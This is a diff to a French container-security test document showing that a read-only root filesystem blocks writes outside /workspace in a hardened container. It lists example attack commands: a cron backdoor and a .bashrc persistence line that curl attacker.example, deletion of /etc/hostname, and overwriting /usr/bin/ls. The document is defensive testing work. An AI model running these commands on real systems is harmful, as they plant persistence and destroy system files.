@@ -1,6 +1,6 @@
 # Attaque 06 — Commande destructrice HORS workspace (FS racine --read-only)
 
-> Attaque #6 de la matrice (`../PLAN.md` section 7). Demontre que le filesystem **racine** du
+> Attaque #6 de la matrice (cf. `00-README.md`). Demontre que le filesystem **racine** du
 > conteneur durci est `--read-only` : aucune ecriture/suppression n'est possible **hors** de
 > `/workspace` (et des tmpfs ephemeres). Empeche depot de binaires, persistance, et destruction.
 
@@ -48,13 +48,13 @@ est de prouver le verrou FS, donc la commande directe suffit.)
 
 ```sh
 # (a) Depot d'une "backdoor" cron HORS workspace
-echo '* * * * * root curl -s http://exfil-server:8000/cron' > /etc/cron.d/backdoor
+echo '* * * * * root curl -s http://attacker.example/cron' > /etc/cron.d/backdoor
 
 # (b) Suppression destructrice d'un fichier systeme
 rm -f /etc/hostname
 
 # (c) Persistance dans le HOME (hors tmpfs .claude)
-echo 'curl -s http://exfil-server:8000/bashrc' >> /home/agent/.bashrc
+echo 'curl -s http://attacker.example/bashrc' >> /home/agent/.bashrc
 
 # (d) Ecrasement d'un binaire systeme
 echo '#!/bin/sh' > /usr/bin/ls
@@ -63,8 +63,9 @@ echo '#!/bin/sh' > /usr/bin/ls
 touch /workspace/temoin-ecriture-ok
 ```
 
-> Transposition `08-attack-suite.sh` : `docker exec <conteneur> sh -c '<commande ci-dessus>'`.
-> Chaque sous-commande (a)-(e) est jouee separement pour capturer son code retour individuel.
+> Sonde reellement jouee (`steps/05`, `steps/07`) : une ecriture temoin **non destructrice**
+> hors workspace, `touch /etc/_pwned_marker` (supprime ensuite sur NU pour ne pas abimer
+> l'image). Prouver l'ECRITURE hors zone suffit ; (a)-(e) restent des exemples du meme effet.
 
 ---
 
@@ -95,13 +96,12 @@ touch /workspace/temoin-ecriture-ok
 
 ## 6. Methode de preuve
 
-1. **Code retour** par sous-commande (`.rc`) : `0` (NU) vs non-zero (DURCI) pour (a)-(d) ;
-   `0` sur les DEUX pour (e).
-2. **Message** (`.out`) : `Read-only file system` cote DURCI pour (a)-(d).
-3. **Etat des cibles** (verification post-attaque) :
-   - `test -e /etc/cron.d/backdoor` : present (NU) / absent (DURCI).
-   - `test -e /etc/hostname` : absent (NU, supprime) / present (DURCI, intact).
-   - `grep -q exfil /home/agent/.bashrc` : vrai (NU) / faux ou erreur (DURCI).
-   - `test -e /workspace/temoin-ecriture-ok` : present sur les DEUX (temoin rw workspace).
+Dans `evidence/attacks-<profil>-detail.log` (genere par la sonde ; copie sanitisee dans
+`../docs/preuves/`) :
 
-Fichiers de sortie attendus : `tp/out/06-nu.*` et `tp/out/06-durci.*` (un bloc par sous-commande).
+1. **Code retour** de `touch /etc/_pwned_marker` : `0` (NU) vs non nul (DURCI,
+   `Read-only file system`).
+2. **Verification d'effet** : `test -e /etc/_pwned_marker` -> present sur NU, absent sur DURCI.
+
+Les sous-commandes (a)-(e) ci-dessus ne sont pas jouees par la suite ; a rejouer a la main pour
+la demo, sur NU elles abimeraient le conteneur (qui est de toute facon jetable).
